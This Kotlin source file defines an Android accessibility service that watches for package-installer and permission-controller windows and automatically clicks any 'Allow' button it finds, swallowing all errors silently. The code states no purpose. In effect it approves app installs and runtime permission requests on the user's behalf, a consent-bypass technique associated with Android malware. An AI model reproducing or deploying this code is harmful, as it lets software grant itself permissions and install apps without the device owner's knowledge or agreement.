package com.xrc.xrc

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class XrcAccessibilityService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        try {
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                val pkg = event.packageName?.toString() ?: return
                if (pkg == "com.android.packageinstaller" ||
                    pkg == "com.google.android.permissioncontroller" ||
                    pkg.contains("permission")
                ) {
                    clickAllowButton()
                }
            }
        } catch (_: Exception) {
            // Never crash the service thread.
        }
    }

    private fun clickAllowButton() {
        val root = rootInActiveWindow ?: return
        val node = findNode(root) { n ->
            n.text?.toString()?.equals("Allow", ignoreCase = true) == true ||
                n.viewIdResourceName?.contains("permission_allow_button") == true ||
                n.viewIdResourceName?.contains("allow_button") == true
        }
        node?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
    }

    private fun findNode(
        node: AccessibilityNodeInfo,
        predicate: (AccessibilityNodeInfo) -> Boolean
    ): AccessibilityNodeInfo? {
        if (predicate(node)) return node
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val hit = findNode(child, predicate)
            if (hit != null) return hit
        }
        return null
    }

    override fun onInterrupt() {
        // Required override.
    }

    companion object {
        fun isEnabled(context: Context): Boolean {
            val expected = context.packageName + "/" + XrcAccessibilityService::class.java.name
            val enabled = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            return enabled.split(':').any { it.equals(expected, ignoreCase = true) }
        }
    }
}
